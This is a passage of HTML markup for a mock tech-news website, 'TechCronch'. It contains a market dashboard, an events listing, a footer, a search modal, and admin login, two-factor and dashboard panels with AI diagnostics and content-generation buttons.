            <p class="text-gray-500 dark:text-gray-400">Latest news and analysis</p>
        </div>
        <div id="category-articles-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
             <!-- Rendered via JS -->
        </div>
    </div>

    <!-- VIEW: MARKET DATA -->
    <div id="view-market" class="view-section hidden h-full">
        <div class="flex flex-col h-full">
            <!-- Header & Ticker -->
            <div class="mb-6">
                <div class="flex items-center justify-between mb-4">
                    <div>
                        <h1 class="text-3xl font-black tracking-tight">Market Command Center</h1>
                        <p class="text-xs text-gray-500 font-mono">LIVE FEED ‚Ä¢ <span class="text-green-500">CONNECTED</span> ‚Ä¢ LATENCY: 24ms</p>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="if(window.showToast) window.showToast('CSV Export feature coming soon!', 'info')" data-ui-enhance data-ui-tooltip="Download Data" class="px-4 py-2 bg-gray-100 dark:bg-gray-800 rounded-lg text-xs font-bold hover:bg-gray-200 dark:hover:bg-gray-700 active:scale-95 transition-transform">EXPORT CSV</button>
                        <button onclick="if(window.showToast) window.showToast('Order entry system unavailable in preview mode.', 'warning')" data-ui-enhance data-ui-tooltip="Place New Trade" data-ui-shortcut="Alt+N" class="px-4 py-2 bg-brand text-black rounded-lg text-xs font-bold shadow-lg shadow-cyan-500/20 hover:bg-brand-dark active:scale-95 transition-transform">NEW ORDER</button>
                    </div>
                </div>
                <!-- Ticker -->
                <div class="w-full bg-black text-white overflow-hidden py-2 rounded-lg relative">
                    <div class="whitespace-nowrap animate-marquee flex gap-8 px-4" id="market-ticker-bar">
                        <!-- JS Injected -->
                    </div>
                </div>
            </div>

            <!-- Dashboard Grid -->
            <div class="grid grid-cols-12 gap-6 flex-1 min-h-0">
                <!-- Left: Asset Selection & Filters -->
                <div class="col-span-12 md:col-span-2 flex flex-col gap-4 overflow-y-auto pr-2">
                    <div class="bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 p-4">
                        <h3 class="text-xs font-bold text-gray-500 uppercase mb-3">Asset Class</h3>
                        <div class="space-y-2">
                            <label class="flex items-center gap-2 text-sm cursor-pointer hover:text-brand"><input type="checkbox" checked class="accent-brand" onchange="filterAssets('Stocks')"> Stocks</label>
                            <label class="flex items-center gap-2 text-sm cursor-pointer hover:text-brand"><input type="checkbox" checked class="accent-brand" onchange="filterAssets('Crypto')"> Crypto</label>
                            <label class="flex items-center gap-2 text-sm cursor-pointer hover:text-brand"><input type="checkbox" checked class="accent-brand" onchange="filterAssets('Forex')"> Forex</label>
                            <label class="flex items-center gap-2 text-sm cursor-pointer hover:text-brand"><input type="checkbox" checked class="accent-brand" onchange="filterAssets('Commodities')"> Commodities</label>
                        </div>
                    </div>
                    
                    <div class="bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 p-4 flex-1">
                        <h3 class="text-xs font-bold text-gray-500 uppercase mb-3 flex justify-between items-center">
                            Watchlist
                            <select onchange="window.sortAssets(this.value)" class="bg-transparent text-xs border-none outline-none cursor-pointer text-gray-500 hover:text-brand">
                                <option value="id">Symbol</option>
                                <option value="price">Price</option>
                                <option value="changeP">Change %</option>
                                <option value="vol">Volume</option>
                                <option value="marketCap">Market Cap</option>
                            </select>
                        </h3>
                        <div id="market-asset-list" class="space-y-1">
                            <!-- JS Injected -->
                        </div>
                    </div>
                </div>

                <!-- Center: Charts -->
                <div class="col-span-12 md:col-span-7 flex flex-col gap-4 min-h-[500px]">
                    <!-- Main Chart Container -->
                    <div class="bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 p-1 flex-1 relative flex flex-col">
                        <div class="flex items-center justify-between p-3 border-b border-gray-100 dark:border-gray-800">
                            <div class="flex items-center gap-2">
                                <h2 id="chart-title" class="font-bold text-lg">AAPL</h2>
                                <span id="chart-price" class="font-mono text-green-500">185.50</span>
                            </div>
                            <div class="flex gap-1 bg-gray-100 dark:bg-gray-800 rounded p-1">
                                <button onclick="setChartTimeframe('1m')" data-ui-enhance data-ui-tooltip="1 Minute Interval" class="px-2 py-1 text-[10px] font-bold rounded hover:bg-white dark:hover:bg-gray-700">1M</button>
                                <button onclick="setChartTimeframe('1h')" data-ui-enhance data-ui-tooltip="1 Hour Interval" class="px-2 py-1 text-[10px] font-bold rounded bg-white dark:bg-gray-600 shadow-sm text-brand">1H</button>
                                <button onclick="setChartTimeframe('1d')" data-ui-enhance data-ui-tooltip="1 Day Interval" class="px-2 py-1 text-[10px] font-bold rounded hover:bg-white dark:hover:bg-gray-700">1D</button>
                                <button onclick="setChartTimeframe('1w')" data-ui-enhance data-ui-tooltip="1 Week Interval" class="px-2 py-1 text-[10px] font-bold rounded hover:bg-white dark:hover:bg-gray-700">1W</button>
                            </div>
                        </div>
                        <div class="relative flex-1 w-full min-h-0 p-2">
                            <canvas id="main-market-chart"></canvas>
                        </div>
                    </div>
                    
                    <!-- Volume / Indicator -->
                    <div class="h-48 bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 p-4 relative">
                         <h3 class="text-xs font-bold text-gray-500 absolute top-2 left-4">Volume Analysis</h3>
                         <canvas id="volume-market-chart"></canvas>
                    </div>
                </div>

                <!-- Right: Info & Depth -->
                <div class="col-span-12 md:col-span-3 flex flex-col gap-4 overflow-y-auto">
                    <!-- Order Book (Simulated) -->
                    <div class="bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 p-4">
                        <h3 class="text-xs font-bold text-gray-500 uppercase mb-3">Depth</h3>
                        <div class="space-y-1 font-mono text-xs">
                            <div class="flex justify-between text-red-500"><span class="opacity-50">185.55</span> <div class="h-1 bg-red-500/30 rounded" style="width: 40%"></div></div>
                            <div class="flex justify-between text-red-500"><span class="opacity-50">185.54</span> <div class="h-1 bg-red-500/30 rounded" style="width: 60%"></div></div>
                            <div class="flex justify-between text-red-500"><span class="opacity-50">185.53</span> <div class="h-1 bg-red-500/30 rounded" style="width: 20%"></div></div>
                            <div class="my-2 border-t border-gray-800 border-dashed"></div>
                            <div class="flex justify-between text-green-500"><span class="opacity-50">185.50</span> <div class="h-1 bg-green-500/30 rounded" style="width: 80%"></div></div>
                            <div class="flex justify-between text-green-500"><span class="opacity-50">185.49</span> <div class="h-1 bg-green-500/30 rounded" style="width: 50%"></div></div>
                            <div class="flex justify-between text-green-500"><span class="opacity-50">185.48</span> <div class="h-1 bg-green-500/30 rounded" style="width: 90%"></div></div>
                        </div>
                    </div>

                    <!-- Events -->
                    <div class="bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 p-4 flex-1">
                        <h3 class="text-xs font-bold text-gray-500 uppercase mb-3">Economic Calendar</h3>
                        <div id="market-events-list" class="space-y-3">
                            <!-- JS Injected -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- VIEW: EVENTS -->
    <div id="view-events" class="view-section hidden">
        <div class="mb-12">
            <h1 class="text-5xl font-black mb-4">Tech Events</h1>
            <p class="text-xl text-gray-500 dark:text-gray-400 max-w-2xl">Discover the most important conferences, summits, and hackathons shaping the future of technology.</p>
        </div>

        <!-- Featured Event Hero -->
        <div id="events-hero" class="mb-12 rounded-2xl overflow-hidden relative h-[400px] group cursor-pointer hidden">
            <!-- Rendered via JS -->
        </div>

        <!-- Filters -->
        <div class="flex flex-col gap-4 mb-8">
            <!-- Categories -->
            <div class="flex flex-wrap gap-2">
                <button onclick="updateEventFilter('category', 'All')" data-ui-enhance class="px-4 py-2 bg-brand text-black font-bold rounded-full text-sm hover:opacity-90 transition-opacity filter-btn-cat-All ring-2 ring-brand">All Events</button>
                <button onclick="updateEventFilter('category', 'Conference')" data-ui-enhance class="px-4 py-2 bg-gray-100 dark:bg-gray-800 font-bold rounded-full text-sm hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors filter-btn-cat-Conference">Conferences</button>
                <button onclick="updateEventFilter('category', 'Hackathon')" data-ui-enhance class="px-4 py-2 bg-gray-100 dark:bg-gray-800 font-bold rounded-full text-sm hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors filter-btn-cat-Hackathon">Hackathons</button>
                <button onclick="updateEventFilter('category', 'Webinar')" data-ui-enhance class="px-4 py-2 bg-gray-100 dark:bg-gray-800 font-bold rounded-full text-sm hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors filter-btn-cat-Webinar">Webinars</button>
            </div>
            
            <!-- Advanced Filters -->
            <div class="flex flex-wrap gap-4 items-center p-4 bg-gray-50 dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800">
                <span class="text-xs font-bold text-gray-500 uppercase">Filter By:</span>
                
                <!-- Impact -->
                <select onchange="updateEventFilter('impact', this.value)" class="bg-transparent text-sm font-bold outline-none cursor-pointer hover:text-brand dark:text-gray-300">
                    <option value="All">Impact Level (All)</option>
                    <option value="High">High Impact</option>
                    <option value="Medium">Medium Impact</option>
                    <option value="Low">Low Impact</option>
                </select>
                
                <div class="w-px h-4 bg-gray-300 dark:bg-gray-700"></div>
                
                <!-- Country -->
                <select onchange="updateEventFilter('country', this.value)" class="bg-transparent text-sm font-bold outline-none cursor-pointer hover:text-brand dark:text-gray-300">
                    <option value="All">Country (All)</option>
                    <option value="US">United States</option>
                    <option value="UK">United Kingdom</option>
                    <option value="Global">Global</option>
                </select>

                <div class="w-px h-4 bg-gray-300 dark:bg-gray-700"></div>

                <button class="ml-auto px-4 py-2 border-2 border-gray-200 dark:border-gray-700 font-bold rounded-full text-sm hover:border-brand transition-colors dark:text-gray-300">üìÖ My Calendar</button>
            </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8" id="events-grid"></div>
    </div>

  </main>

  <!-- FOOTER -->
  <footer class="bg-gray-50 dark:bg-[#0a0a0c] border-t border-gray-200 dark:border-gray-800 pt-16 pb-8">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="grid grid-cols-1 md:grid-cols-4 gap-12 mb-12">
            <div class="space-y-4">
                <div class="flex items-center gap-2">
                    <div class="w-10 h-10 rounded bg-[#00d084] flex items-center justify-center text-white font-bold text-lg">TC</div>
                    <span class="text-2xl font-black tracking-tighter techcronch-logo">TechCronch</span>
                </div>
                <p class="text-gray-500 text-sm leading-relaxed">
                    Reporting on the business of technology, startups, venture capital funding, and Silicon Valley.
                </p>
                <div class="flex gap-4">
                    <a href="#" class="text-gray-400 hover:text-brand transition-colors"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/></svg></a>
                    <a href="#" class="text-gray-400 hover:text-brand transition-colors"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.072 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg></a>
                    <a href="#" class="text-gray-400 hover:text-brand transition-colors"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg></a>
                </div>
            </div>
            
            <div>
                <h4 class="font-bold text-white mb-6">Categories</h4>
                <ul class="space-y-3 text-sm text-gray-500">
                    <li><a href="#category/Startups" class="hover:text-brand transition-colors">Startups</a></li>
                    <li><a href="#category/AI" class="hover:text-brand transition-colors">Artificial Intelligence</a></li>
                    <li><a href="#category/Crypto" class="hover:text-brand transition-colors">Crypto & Web3</a></li>
                    <li><a href="#category/Security" class="hover:text-brand transition-colors">Security</a></li>
                    <li><a href="#market" class="hover:text-brand transition-colors">Market Data</a></li>
                    <li><a href="https://techcrunch.com" target="_blank" class="hover:text-brand transition-colors">Events</a></li>
                </ul>
            </div>

            <div>
                <h4 class="font-bold text-white mb-6">Company</h4>
                <ul class="space-y-3 text-sm text-gray-500">
                    <li><a href="#" class="hover:text-brand transition-colors">About Us</a></li>
                    <li><a href="#" class="hover:text-brand transition-colors">Careers</a></li>
                    <li><a href="#" class="hover:text-brand transition-colors">Advertise</a></li>
                    <li><a href="#" class="hover:text-brand transition-colors">Contact</a></li>
                    <li><a href="#" class="hover:text-brand transition-colors">Privacy Policy</a></li>
                </ul>
            </div>

            <div>
                <h4 class="font-bold text-white mb-6">Newsletter</h4>
                <p class="text-sm text-gray-500 mb-4">Get the top stories in your inbox every morning.</p>
                <div class="flex flex-col gap-2">
                    <input type="email" placeholder="Enter your email" class="w-full px-4 py-2 bg-gray-100 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg focus:ring-2 focus:ring-brand outline-none text-sm" />
                    <button class="w-full py-2 bg-brand text-black font-bold rounded-lg hover:opacity-90 transition-opacity text-sm" data-ui-enhance data-ui-loading="true" onclick="if(window.showToast) window.showToast('Subscribed!', 'success')">Subscribe</button>
                </div>
            </div>
        </div>
        
        <div class="border-t border-gray-200 dark:border-gray-800 pt-8 flex flex-col md:flex-row justify-between items-center gap-4">
            <p class="text-xs text-gray-500">¬© 2026 TechCronch Media Inc. All rights reserved.</p>
            <p class="text-xs text-gray-600 dark:text-gray-500 font-mono">System Status: <span class="text-green-500">Operational</span></p>
        </div>
    </div>
  </footer>

  <!-- MODALS (Hidden by default) -->
  
  <!-- Search Modal -->
  <div id="search-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-[70] hidden opacity-0 transition-opacity duration-300">
      <div class="absolute top-0 inset-x-0 p-4 max-w-3xl mx-auto">
          <div class="bg-white dark:bg-[#1a1a1d] rounded-2xl shadow-2xl overflow-hidden transform -translate-y-full transition-transform duration-300" id="search-panel">
              <div class="p-4 border-b border-gray-200 dark:border-gray-700 flex items-center gap-4">
                  <svg class="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
                  <input type="text" id="search-input" class="flex-1 bg-transparent text-xl font-bold outline-none placeholder-gray-400 dark:text-white" placeholder="Search stories, authors, tags..." oninput="handleSearch(this.value)" />
                  <button onclick="closeSearch()" data-ui-enhance data-ui-tooltip="Close" data-ui-shortcut="Escape" class="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg></button>
              </div>
              <div id="search-results" class="max-h-[60vh] overflow-y-auto p-4 space-y-2">
                  <div class="text-center text-gray-500 py-8">Type to search...</div>
              </div>
          </div>
      </div>
  </div>

  <!-- Admin Login Modal -->
  <div id="admin-login-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[90] hidden flex items-center justify-center">
      <div class="bg-[#0a0a0c] w-full max-w-md p-8 rounded-2xl shadow-2xl border border-gray-800 relative overflow-hidden">
          <!-- Cyber Decoration -->
          <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent opacity-50"></div>
          
          <div class="text-center mb-8">
              <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-red-500/10 flex items-center justify-center border border-red-500/20">
                  <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
              </div>
              <h2 class="text-2xl font-black text-white mb-2 tracking-tight">System Access</h2>
              <p class="text-gray-500 text-xs uppercase tracking-widest">Restricted Environment ‚Ä¢ Authorized Personnel Only</p>
          </div>
          
          <div class="space-y-5">
              <div>
                  <label class="block text-xs font-bold text-gray-500 mb-2 uppercase">Security Clearance</label>
                  <input type="password" id="admin-password" class="w-full px-4 py-3 bg-[#151518] text-white border border-gray-800 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all font-mono text-center tracking-widest" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" onkeyup="if(event.key === 'Enter') attemptAdminLogin()" />
              </div>
              
              <button onclick="attemptAdminLogin()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Secure Login" data-ui-analytics-event="admin_login_attempt" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition-all shadow-lg shadow-red-900/20 flex items-center justify-center gap-2 group">
                  <span>Authenticate</span>
                  <svg class="w-4 h-4 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3" /></svg>
              </button>
              
              <button onclick="closeAdminLogin()" class="w-full text-gray-600 hover:text-gray-400 text-xs font-bold transition-colors uppercase tracking-wider">
                  Abort Sequence
              </button>
          </div>
      </div>
  </div>

  <!-- 2FA Modal -->
  <div id="admin-2fa-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[95] hidden flex items-center justify-center">
      <div class="bg-[#0a0a0c] w-full max-w-sm p-8 rounded-2xl shadow-2xl border border-cyan-900/30 relative overflow-hidden">
          <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-cyan-500 to-transparent"></div>
          
          <div class="text-center mb-8">
              <h2 class="text-xl font-bold text-white mb-2">Two-Factor Auth</h2>
              <p class="text-cyan-500 text-xs font-mono">Code sent to secure console</p>
          </div>
          
          <div class="mb-6">
              <input type="text" id="admin-2fa-code" maxlength="6" class="w-full px-4 py-4 bg-[#151518] text-cyan-400 border border-gray-800 rounded-lg focus:ring-2 focus:ring-cyan-500 outline-none text-center font-mono text-2xl tracking-[0.5em]" placeholder="000000" onkeyup="if(event.key === 'Enter') verify2FA()" />
          </div>
          
          <button onclick="verify2FA()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Verify Identity" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-3 rounded-lg transition-colors shadow-lg shadow-cyan-900/20">
              Verify Identity
          </button>
      </div>
  </div>

  <div id="admin-modal" class="fixed inset-0 bg-black/90 backdrop-blur-md z-[80] hidden flex items-center justify-center">
      <div class="bg-white dark:bg-[#1a1a1d] w-full max-w-4xl h-[80vh] rounded-2xl shadow-2xl overflow-hidden flex flex-col">
          <div class="p-6 border-b border-gray-200 dark:border-gray-700 flex justify-between items-center bg-gray-50 dark:bg-gray-800/50">
              <div class="flex items-center gap-4">
                  <h2 class="text-2xl font-black text-[#00d084]">Admin Dashboard</h2>
                  <button onclick="adminLogout()" data-ui-enhance data-ui-tooltip="End Session" data-ui-confirm="Are you sure you want to logout?" class="text-xs bg-red-500/10 text-red-500 hover:bg-red-500 hover:text-white px-3 py-1 rounded-full font-bold transition-colors">Logout</button>
              </div>
              <button onclick="toggleAdminPanel()" class="text-gray-500 hover:text-red-500"><svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg></button>
          </div>
          <div class="flex-1 overflow-y-auto p-6">
              <!-- Admin Tabs -->
              <div class="flex gap-6 border-b border-gray-200 dark:border-gray-700 mb-6">
                  <button onclick="switchAdminTab('dashboard')" id="tab-dashboard" class="pb-2 border-b-2 border-brand text-brand font-bold transition-colors">Dashboard</button>
                  <button onclick="switchAdminTab('validator')" id="tab-validator" class="pb-2 border-b-2 border-transparent text-gray-500 hover:text-gray-300 font-bold transition-colors">AI Diagnostics</button>
              </div>

              <!-- View: Dashboard -->
              <div id="admin-view-dashboard">
                  <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                  <!-- Recent Comments Moderation -->
                  <div>
                      <h3 class="text-lg font-bold mb-4 flex items-center gap-2">
                          <span class="w-2 h-2 rounded-full bg-yellow-400"></span>
                          Moderation Queue
                      </h3>
                      <div id="admin-comments-list" class="space-y-3">
                          <!-- JS Populated -->
                      </div>
                  </div>
                  <!-- Content Management -->
                  <div>
                      <h3 class="text-lg font-bold mb-4 flex items-center gap-2">
                          <span class="w-2 h-2 rounded-full bg-green-400"></span>
                          Content Management
                      </h3>
                      <div id="admin-articles-list" class="space-y-3">
                          <!-- JS Populated -->
                      </div>
                  </div>
              </div>
              
              <!-- AI Agent Operations -->
              <div id="admin-dashboard-ai-status" class="hidden">
                  <div class="flex items-center justify-between mb-6">
                      <div>
                          <h3 class="text-xl font-bold flex items-center gap-2">
                              <span class="relative flex h-3 w-3">
                                  <span id="ai-status-ping" class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75 hidden"></span>
                                  <span id="ai-status-dot" class="relative inline-flex rounded-full h-3 w-3 bg-gray-400"></span>
                              </span>
                              AI Service Status
                          </h3>
                          <p class="text-xs text-gray-500" id="ai-status-text">Ready to scan</p>
                      </div>
                      <button onclick="window.AIValidator.runAll()" id="btn-run-tests" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Start Diagnostics" class="bg-brand hover:bg-cyan-600 text-white font-bold py-2 px-6 rounded-lg shadow-lg shadow-cyan-500/20 transition-all flex items-center gap-2">
                          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                          Run Full Diagnostics
                      </button>
                  </div>

                  <!-- Metrics Grid -->
                  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
                      <div class="bg-gray-50 dark:bg-gray-800 p-4 rounded-xl border border-gray-200 dark:border-gray-700">
                          <p class="text-[10px] text-gray-400 uppercase font-bold mb-1">Total Tests</p>
                          <p id="ai-tests-total" class="text-2xl font-black font-mono">0</p>
                      </div>
                      <div class="bg-green-50 dark:bg-green-900/20 p-4 rounded-xl border border-green-100 dark:border-green-800">
                          <p class="text-[10px] text-green-600 dark:text-green-400 uppercase font-bold mb-1">Passed</p>
                          <p id="ai-tests-passed" class="text-2xl font-black font-mono text-green-600 dark:text-green-400">0</p>
                      </div>
                      <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-xl border border-red-100 dark:border-red-800">
                          <p class="text-[10px] text-red-600 dark:text-red-400 uppercase font-bold mb-1">Failed</p>
                          <p id="ai-tests-failed" class="text-2xl font-black font-mono text-red-600 dark:text-red-400">0</p>
                      </div>
                      <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-xl border border-blue-100 dark:border-blue-800">
                          <p class="text-[10px] text-blue-600 dark:text-blue-400 uppercase font-bold mb-1">Duration</p>
                          <p id="ai-tests-duration" class="text-2xl font-black font-mono text-blue-600 dark:text-blue-400">0ms</p>
                      </div>
                  </div>

                  <!-- Results List -->
                  <div class="bg-white dark:bg-[#151518] rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden">
                      <div class="bg-gray-50 dark:bg-gray-800/50 px-6 py-3 border-b border-gray-200 dark:border-gray-700 font-bold text-xs uppercase text-gray-500">
                          Execution Log
                      </div>
                      <div id="ai-test-results" class="divide-y divide-gray-100 dark:divide-gray-800 max-h-[400px] overflow-y-auto">
                          <div class="p-8 text-center text-gray-400 italic">No diagnostics run yet. Click "Run Full Diagnostics" to begin.</div>
                      </div>
                  </div>
              </div>
              
              <!-- AI Agent Operations -->
                <div class="mt-8 pt-8 border-t border-gray-200 dark:border-gray-700">
                    <!-- Live Analytics -->
                    <div class="mb-8">
                        <h3 class="text-xl font-bold mb-4 flex items-center gap-2 text-blue-500">
                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
                            Live User Insights
                        </h3>
                        <div class="bg-gray-900 text-white p-6 rounded-xl grid grid-cols-1 md:grid-cols-3 gap-6">
                            <div>
                                <p class="text-xs text-gray-400 uppercase font-bold mb-1">Active Session Time</p>
                                <p id="admin-analytics-time" class="text-3xl font-black font-mono">00:00</p>
                            </div>
                            <div>
                                <p class="text-xs text-gray-400 uppercase font-bold mb-1">Top Interest</p>
                                <p id="admin-analytics-interest" class="text-3xl font-black text-brand">Analyzing...</p>
                            </div>
                            <div>
                                <p class="text-xs text-gray-400 uppercase font-bold mb-1">Interaction Score</p>
                                <p id="admin-analytics-score" class="text-3xl font-black font-mono">0</p>
                            </div>
                        </div>
                    </div>

                    <h3 class="text-xl font-bold mb-4 flex items-center gap-2 text-purple-500">
                      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z" /></svg>
                      AI Content Agent
                  </h3>
                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div class="bg-purple-50 dark:bg-purple-900/20 p-4 rounded-xl border border-purple-100 dark:border-purple-800">
                          <h4 class="font-bold mb-2">Auto-Generate News</h4>
                          <p class="text-sm text-gray-500 dark:text-gray-400 mb-4">AI will scan global feeds and generate breaking news stories.</p>
                          <button onclick="AIContentAgent.generateNews()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Create Content" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded-lg transition-colors flex items-center justify-center gap-2">
                              <span>Generate Story</span>
                              <svg class="w-4 h-4 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                          </button>
                      </div>
                      <div class="bg-cyan-50 dark:bg-cyan-900/20 p-4 rounded-xl border border-cyan-100 dark:border-cyan-800">
                          <h4 class="font-bold mb-2">Refresh & Analyze</h4>
                          <p class="text-sm text-gray-500 dark:text-gray-400 mb-4">Analyze old content and update with recent data.</p>
                          <button onclick="AIContentAgent.refreshContent()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Refresh Data" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-2 px-4 rounded-lg transition-colors flex items-center justify-center gap-2">
                              <span>Analyze & Update</span>
